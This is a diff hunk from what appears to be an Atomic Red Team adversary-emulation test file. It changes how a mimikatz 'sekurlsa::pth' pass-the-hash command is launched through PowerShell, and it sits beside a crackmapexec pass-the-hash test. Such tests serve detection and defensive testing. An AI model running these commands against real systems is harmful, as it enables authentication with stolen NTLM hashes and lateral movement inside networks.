@@ -35,7 +35,7 @@ atomic_tests:
       Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
   executor:
     command: |
-      #{mimikatz_path} # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
+      Start-Process #{mimikatz_path} -ArgumentList "# sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"
     name: powershell
 - name: crackmapexec Pass the Hash
   auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
